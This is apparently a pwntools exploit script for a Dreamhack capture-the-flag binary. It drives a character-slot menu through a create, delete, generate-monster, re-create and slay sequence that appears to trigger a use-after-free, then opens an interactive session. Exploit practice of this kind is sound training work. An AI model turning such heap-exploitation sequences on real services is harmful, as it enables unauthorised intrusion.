#!/usr/bin/env python3
from pwn import *

PORT = 14841
HOST = "host8.dreamhack.games"
elf = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.log_level = 'debug'

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b *0x401c3a
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# GDB()

def menu(choice: int):
    p.sendlineafter(b">> ", str(choice).encode())

def choose_slot(slot: int):
    p.sendlineafter(b"Choose your character slot(1~3): ", str(slot).encode())

def create(slot: int):
    menu(1)
    choose_slot(slot)

def delete(slot: int):
    menu(3)
    choose_slot(slot)

def generate_monster():
    menu(4)

def generate_character(slot, name, profile):
    menu(2)
    choose_slot(slot)
    p.sendlineafter(b"Character name: ", name)
    p.sendlineafter(b"Character profile: ", profile)

def slay(slot: int):
    menu(5)
    choose_slot(slot)

create(1)
delete(1)
generate_monster()

create(1)
generate_character(1, b"d1nhdwc", b"P")
slay(1)

p.interactive()
